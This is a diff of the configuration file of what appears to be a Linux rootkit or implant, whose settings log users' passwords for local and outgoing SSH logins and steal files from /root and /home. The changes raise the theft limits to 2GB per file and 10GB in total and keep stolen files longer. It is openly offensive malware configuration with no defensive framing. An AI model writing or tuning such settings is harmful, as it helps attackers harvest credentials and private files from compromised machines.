@@ -70,7 +70,7 @@ LOG_USER_EXEC  = True          # log stuff executed by users. from the moment of
 LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
 LOG_SSH        = True          # log outgoing ssh login attempts.
 LOG_FMT        = '%s (%s)\\n'  # format is '<(ssh )user(@host)> (<password>)\n'
-MAX_LOGS_SIZE   = (1024 * 1024) * 150  # don't store more than 150mb of logs per log type. can be disabled.
+MAX_LOGS_SIZE   = (1024 * 1024) * 100  # don't store more than 100mb of logs per log type. can be disabled.
 
 
 # START OF FILE STEALING STUFF.
@@ -88,12 +88,12 @@ INTERESTING_DIRECTORIES = ['/root', '/home']
 # when stealing files ignore these filenames. wildcards apply. can be disabled. is by default.
 NAMES_BLACKLIST = []
 
-MAX_FILE_SIZE      = (1024 * 1024) * 100   # don't try to steal files bigger than 100mb. file contents are mapped into memory & written in a new background process.
-FILE_CLEANSE_TIMER = (60 * 60) * 8         # remove stolen files every 8 hours. you may want to change this value...can be disabled.
+MAX_FILE_SIZE      = (1024 * 1024 * 1024) * 2   # don't try to steal files bigger than 2gb. file contents are mapped into memory & written in a new background process.
+FILE_CLEANSE_TIMER = (60 * 60) * 12         # remove stolen files every 12 hours. you may want to change this value...can be disabled.
 
 # this will limit how much stuff can be stored at one time. target files that would put the current total stolen size over this value
-# will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 800mb by default. can be disabled.
-MAX_STEAL_SIZE = (1024 * 1024) * 800
+# will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 10gb by default. can be disabled.
+MAX_STEAL_SIZE = (1024 * 1024 * 1024) * 10
 
 # if mapping the file contents fails, use the original method of reading & writing in blocks.
 ORIGINAL_RW_FALLBACK = True
